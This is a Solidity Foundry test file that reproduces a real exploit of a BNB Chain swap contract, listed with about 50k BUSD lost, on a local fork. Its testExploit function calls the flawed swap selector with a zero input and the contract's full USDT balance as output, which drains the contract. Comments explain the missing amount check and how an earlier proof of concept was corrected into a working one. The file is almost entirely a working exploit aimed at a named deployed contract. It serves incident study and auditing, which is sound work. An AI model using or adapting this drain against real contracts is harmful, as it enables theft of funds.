// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~50k $BUSD
// Attacker : https://bscscan.com/address/0x8ccf2860f38fc2f4a56dec897c8c976503fcb123
// Attack Contract : https://bscscan.com/address/0x64b9d294cd918204d1ee6bce283edb49302ddf7e
// Created Attack Contract: https://bscscan.com/address/0xa901FDA83E9906e6177f3A3f7B85f13f68723326
// Vulnerable Contract : https://bscscan.com/address/0xdb4b73df2f6de4afcd3a883efe8b7a4b0763822b
// Attack Tx : https://bscscan.com/tx/0x368f842e79a10bb163d98353711be58431a7cd06098d6f4b6cbbcd4c77b53108

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 GAX = IERC20(0xD5d63074A39Bc0202E828B044C02c6F4d2f75c76);
    address VulnContract_addr = 0xdb4b73Df2F6dE4AFCd3A883efE8b7a4B0763822b;

    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8546", 40_375_925 - 1);
        vm.label(address(BUSD), "BUSD");
        vm.label(address(GAX), "GAX");
        vm.label(address(VulnContract_addr), "VulnContract");
    }

    function testExploit() public {
        uint256 before = BUSD.balanceOf(address(this));
        emit log_named_decimal_uint("Attacker BUSD balance before attack", before, 18);

        // The vulnerable swap function 0x6c99d7c8 takes THREE raw uint256 args:
        //   (amountIn, amountOut, _unused)
        // It pulls `amountIn` GAX from the caller (here 0 -> transferFrom(_,_,0) always
        // succeeds), then blindly pays out `amountOut` USDT to the caller, with no check
        // that amountIn is proportional to amountOut. The attacker requests the
        // contract's entire USDT balance while paying nothing.
        //
        // NOTE: The original repo PoC wrapped these args in abi.encode(...) and passed
        // them as `bytes`, which shifts the parameters by two words. The contract then
        // read the 0x20 ABI offset word as the GAX amount, so GAX.transferFrom reverted
        // with "Insufficient balance". Because the original used an unchecked low-level
        // .call(), that revert was swallowed and the test falsely "passed" with 0 profit.
        // Here we replicate the REAL on-chain calldata (three raw uints) for a true PoC.
        uint256 amountOut = BUSD.balanceOf(address(VulnContract_addr));
        (bool ok,) = VulnContract_addr.call(abi.encodeWithSelector(bytes4(0x6c99d7c8), uint256(0), amountOut, uint256(0)));
        require(ok, "swap call failed");

        uint256 afterBal = BUSD.balanceOf(address(this));
        emit log_named_decimal_uint("Attacker BUSD balance after attack", afterBal, 18);
        emit log_named_decimal_uint("Profit (BUSD/USDT)", afterBal - before, 18);

        assertGt(afterBal, before, "no profit");
        assertEq(afterBal - before, amountOut, "did not drain full balance");
    }

    fallback() external payable {}
    receive() external payable {}
}
